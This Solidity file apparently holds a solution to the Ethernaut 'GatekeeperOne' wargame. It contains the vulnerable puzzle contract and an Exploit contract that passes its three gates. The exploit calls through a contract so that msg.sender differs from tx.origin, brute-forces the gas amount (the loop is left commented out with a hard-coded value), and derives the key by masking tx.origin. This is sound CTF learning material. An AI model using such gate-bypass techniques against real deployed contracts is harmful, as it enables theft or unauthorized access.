// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "forge-std/Test.sol";

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Exploit {
  GatekeeperOne gatekeeperOne;

  constructor(address _gatekeeperOne) {
    gatekeeperOne = GatekeeperOne(_gatekeeperOne);
  }

  function exploit() external {
    // gateOne
    // this needs contract needs to call gateKeeper so msg.sender != tx.origin
    // gateTwo
    // gasLeft needs to be dividable by 8191
    
    bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

    // bool success = false;
    // for (uint256 i = 0; i < 500; i++) {
    //   uint256 gasToSend = i + (8191 * 3);
    //   (bool result, ) = address(gatekeeperOne).call{gas: gasToSend}(abi.encodeWithSignature("enter(bytes8)", key));
    //   if(result) {
    //     console2.log("XXXXXX: ", gasToSend);
    //     success = result;
    //     break;
    //   }
    // }

    
    (bool resultx, ) = address(gatekeeperOne).call{gas: 24841}(abi.encodeWithSignature("enter(bytes8)", key));
    require(resultx, "Enter not successful");
    // require(success, "Enter not successful");
  }
}